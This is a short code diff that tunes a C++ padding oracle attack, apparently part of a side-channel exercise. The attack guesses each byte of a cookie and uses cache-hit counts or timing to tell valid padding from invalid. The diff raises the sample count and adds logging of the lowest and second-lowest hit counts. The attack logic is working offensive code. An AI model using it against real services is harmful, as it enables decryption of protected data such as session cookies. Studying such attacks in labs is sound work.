@@ -274,7 +274,7 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::vector<uint8_t> recovered(16, 0);
 
   // Use more samples since signal is weak
-  const int SAMPLES = 15;
+  const int SAMPLES = 31;
 
   // Padding oracle attack
   for (int pos = 15; pos >= 0; pos--) {
@@ -294,6 +294,7 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     if (use_cache_hits) {
       // LogError called = cache hit = valid padding should have FEWER hits
       int min_hits = INT_MAX;
+      int second_min_hits = INT_MAX;
 
       for (int guess = 0; guess < 256; guess++) {
         modified[pos] = static_cast<std::byte>(guess);
@@ -302,10 +303,15 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
         int hits = count_hits(client, test_cookie, SAMPLES, use_threshold);
 
         if (hits < min_hits) {
+          second_min_hits = min_hits;
           min_hits = hits;
           best_guess = guess;
+        } else if (hits < second_min_hits) {
+          second_min_hits = hits;
         }
       }
+
+      std::cout << "[min=" << min_hits << ",2nd=" << second_min_hits << "] ";
     } else {
       // Fall back to minimum probe time across many samples
       // Valid padding = LogError NOT called = potentially different timing
